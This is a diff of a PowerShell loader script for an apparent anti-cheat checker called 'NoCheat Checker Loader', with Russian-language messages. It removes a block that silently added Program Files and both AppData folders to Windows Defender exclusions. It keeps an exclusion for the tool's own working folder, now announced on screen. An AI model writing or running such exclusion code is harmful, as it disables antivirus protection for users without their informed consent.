@@ -27,28 +27,6 @@ if (-not $isAdmin) {
     exit
 }
 
-try {
-    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        $updpath = $ProgramFiles -replace " \(x86\)", ""
-        Add-MpPreference -ExclusionPath $updpath
-
-        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        if (Test-Path $ProgramFilesX86) {
-            Add-MpPreference -ExclusionPath $ProgramFilesX86
-        }
-
-        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-        Add-MpPreference -ExclusionPath $AppData
-
-        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-        Add-MpPreference -ExclusionPath $LocalAppData
-    }
-}
-catch {
-    Write-Host "[-] Ошибка добавления исключений: $($_.Exception.Message)" -ForegroundColor Red
-}
-
 Write-Host "==========================================" -ForegroundColor Yellow
 Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
 Write-Host "==========================================" -ForegroundColor Yellow
@@ -71,6 +49,7 @@ $exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
     if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
         Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
     }
 
